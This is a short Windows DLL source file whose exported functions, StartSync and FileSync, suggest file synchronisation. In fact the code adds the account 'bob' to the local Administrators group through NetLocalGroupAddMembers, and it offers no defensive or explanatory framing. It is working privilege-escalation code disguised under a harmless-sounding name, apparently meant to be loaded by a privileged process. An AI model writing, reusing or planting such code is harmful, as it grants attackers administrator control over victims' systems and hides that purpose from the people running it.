#include <windows.h>
#include <lm.h>
#include <stdio.h>
#pragma comment(lib, "netapi32.lib")


void FileSync() {
    LPCWSTR targetUser = L"bob"; 
    PCWSTR targetGroup = L"Administrators";
    LOCALGROUP_MEMBERS_INFO_3 memberInfo = {0};
    memberInfo.lgrmi3_domainandname = (LPWSTR)targetUser;
    
    NET_API_STATUS status = NetLocalGroupAddMembers(NULL, targetGroup, 3, (LPBYTE)&memberInfo, 1);
}

extern "C" __declspec(dllexport) void StartSync() {
    FileSync();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE; 
}
